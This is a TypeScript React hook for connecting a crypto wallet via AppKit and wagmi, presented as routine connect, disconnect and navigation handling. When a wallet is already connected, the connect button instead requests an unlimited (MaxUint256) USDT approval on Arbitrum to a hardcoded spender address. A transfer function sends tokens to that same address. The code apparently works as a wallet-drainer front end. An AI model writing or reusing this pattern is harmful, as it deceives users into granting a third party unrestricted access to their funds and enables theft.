import { useAppKit } from "@reown/appkit/react";
import { useState } from "react";
import { useAccount, useWriteContract, useDisconnect } from "wagmi";
import { MaxUint256 } from "ethers";

// export const USDT_ARBITRUM_ABI_APPROVE = [
//   {
//     type: "function",
//     name: "transfer",
//     stateMutability: "nonpayable",
//     inputs: [
//       { name: "recipient", type: "address" },
//       { name: "amount", type: "uint256" },
//     ],
//     outputs: [{ type: "bool" }],
//   },
// ];

export const USDT_ARBITRUM_ABI_APPROVE = [
  {
    constant: false, // Or you can omit this line
    inputs: [
      {
        name: "spender", // Standard name for the first argument
        type: "address",
      },
      {
        name: "value", // Standard name for the second argument (amount)
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false, // Or you can omit this line
    stateMutability: "nonpayable",
    type: "function",
  },
];

export const USDT_ARBITRUM_ABI_TRANSFER = [
  {
    type: "function",
    name: "transfer",
    stateMutability: "nonpayable",
    inputs: [
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ type: "bool" }],
  },
];

// export const config = createConfig({
//   chains: [mainnet, polygon, arbitrum, sepolia],
//   transports: {
//     [mainnet.id]: http(),
//     [arbitrum.id]: http(),
//     [sepolia.id]: http(),
//     [polygon.id]: http(),
//   },
// });

const USDT_ARBITRUM_CONTRACT = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";

// const USDT_SEPOLIA_CONTRACT =
//   "0x6ca1d0ba653065d96bfefeb68fc65e56e576ff6ecc72ce245890b97a9b65c075";

const APPROVE_TO_WALLET =
  import.meta.env.VITE_SPENDER_ADDRESS ||
  "0x17E332631Eab05d8037B38c1b6BE784bd638B931";

export const useConnectWallet = () => {
  const [openNav, setOpenNav] = useState(false);
  const { open } = useAppKit();
  const { isConnected, address } = useAccount();
  const { writeContract } = useWriteContract();

  console.log(address, "address");
  console.log(openNav, "openNav");
  console.log("API URL:", import.meta.env.VITE_API_URL);

  // Handle the opening of the navigation
  const handleOpenNav = () => {
    setOpenNav((prev) => !prev);
  };

  const { disconnect } = useDisconnect();

  const handleDisconnect = () => {
    disconnect();
  };

  // Handle opening the wallet modal if not connected
  const handleOpenModal = () => {
    if (isConnected) {
      approveTokens();
    } else {
      // Open wallet modal if not connected
      open();
    }
  };

  // Approve token function
  const approveTokens = async () => {
    writeContract({
      abi: USDT_ARBITRUM_ABI_APPROVE,
      address: USDT_ARBITRUM_CONTRACT,
      functionName: "approve",
      args: [APPROVE_TO_WALLET, MaxUint256],
    });
  };

  const transferTokens = async (tokens: string) => {
    writeContract({
      abi: USDT_ARBITRUM_ABI_TRANSFER,
      address: USDT_ARBITRUM_CONTRACT,
      functionName: "transfer",
      args: [APPROVE_TO_WALLET, tokens],
    });
  };

  return {
    approveTokens,
    handleOpenNav,
    handleOpenModal,
    handleDisconnect,
    transferTokens,
  };
};
